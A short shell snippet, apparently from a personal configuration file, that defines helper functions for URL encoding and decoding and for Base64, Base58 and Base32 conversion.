#--------------Encode - Decode--------------#

urldecode(){
echo ""
python ~/Organize/Platform/WebApp/url-decode.py $1
}
urlencode(){
python ~/Organize/Platform/WebApp/url-encode.py $1
}
decode(){
echo "$1" | base64 -d
}
encode(){
echo "$1" | base64
}
decodeall(){
echo "Base64"
echo -n "$1" | base64 -d
echo ""
echo "Base58"
echo -n "$1" | base58 -d
echo ""
echo ""
echo "Base32"
echo -n "$1" | base32 -d
}

